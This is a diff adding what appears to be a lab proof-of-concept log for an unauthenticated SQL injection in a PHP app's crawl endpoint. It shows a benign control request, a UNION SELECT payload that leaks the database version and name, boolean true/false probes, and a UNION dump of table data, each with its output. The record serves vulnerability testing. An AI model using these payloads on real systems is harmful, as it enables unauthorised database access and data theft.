@@ -1,0 +1,32 @@
+=== MANONG-01: unauth SQLi via POST number (a=crawl) ===
+[control] benign POST number=1 (cache row exists):
+value='Test Item One'
+value='desc one'
+value='http://example.com/1'
+value='1'
+value='1'
+value=''
+value='Test Item Two'
+value='desc two'
+
+[injection] number=0 UNION SELECT 1,version(),database(),4,5,6-- - :
+value='8.0.39'
+value='manong'
+value='4'
+value='1'
+value='5'
+value=''
+
+[boolean] number=1 AND 1=1 (true -> rows):
+0
+[boolean] number=1 AND 1=2 (false -> no rows, falls through to crawler fail):
+searching for cache<br>no cache,start crawling<br><br />
+<b>Warning</b>:  file_get_contents(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in <b><LAB_ROOT>
+[extract] dump issue categories via UNION:
+value='PHP,PYTHON'
+value='2'
+value='3'
+value='1'
+[boolean-corrected] count of rendered cache rows:
+  number=1 AND 1=1 -> item count: 1
+  number=1 AND 1=2 -> item count: 0
